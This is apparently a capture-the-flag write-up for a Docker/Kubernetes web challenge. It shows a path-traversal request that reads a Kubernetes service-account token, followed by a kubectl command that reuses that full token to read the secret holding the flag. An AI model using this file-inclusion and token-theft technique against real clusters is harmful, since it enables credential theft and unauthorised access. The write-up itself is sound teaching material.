#### Challenge:

You're probably thinking, oh wow here is another challenge author thinking they would be smart by having the word whale in the challenge title, oh wow it's probably Docker. Well you're right whale=docker this challenge has to do with docker. Get that flag ⛳.

**NOTE**: You may experience some SSL issue will completing this challenge, please ignore them. We are working on a fix.

[whale-blog.duc.tf](http://whale-blog.duc.tf:30000/)

---

#### Solution:

First, we noticed `Local File Inclusion (LFI)` vulnerability in the provided site. Since the challenge hints at `whales` we figured that it runs on `kubernetes`. With that we used the LFI to get the token of the serviceaccount:

```bash
curl http://whale-blog.duc.tf:30000/?page=../../../../../../run/secrets/kubernetes.io/serviceaccount/token
```

With that we were able to run kubectl commands against the cluster. After some time poking around we found the `flag` in one of the `secrets`:

```bash
kubectl get secret nooooo-dont-read-me -o json --server https://whale-endpoint.duc.tf:443 --token eyJhbGciOiJSUzI1NiIsImtpZCI6Il9aWTAzOVpGRXVLVUJMdngzbDJ2b1ZnRV9QOXVHTHI2WC1QeVBzWGp1eGMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3RqYjciLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjY4OTllYzliLWQyNGMtNDNlMS1hNzFiLWZlZjAzOWRkY2RkZiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.VbWj-lRsEhste-RvsjFaYM_ndXXVK1AzyIlcuuNoc1Q5DZmKJZDQdLVCLIJSKQR5vCByACDPRGTLGeJTyVr3Abx_Oa_t2Pkov62BExBq-HSk8Y-HZYDicKG5bSrdMT2UkvSONttX-u-5q0mtrNPpWkIoFDRg0g-bX_h6ggme4ZcMT9ccyH_LUeaM9l_0DG5bYFWMUd1smCom1M7kTzz8rEllL7VfS1-FJ_9s7MuHQ280nSFqH90iAu7UQcrMhxsP-96d9sI-Tkqwkw-gL3orovdiLXbed_VPdp-D5HE14Olr5ZM_rSsl4ki56y1VXJbOzC1rK9Qrm3qLxk4Njs3SMw --insecure-skip-tls-verify
```

---

<details><summary>FLAG:</summary>

```
DUCTF{g00nies_got_th1s_l4st_year_now_u_did!}
```

</details>
<br/>
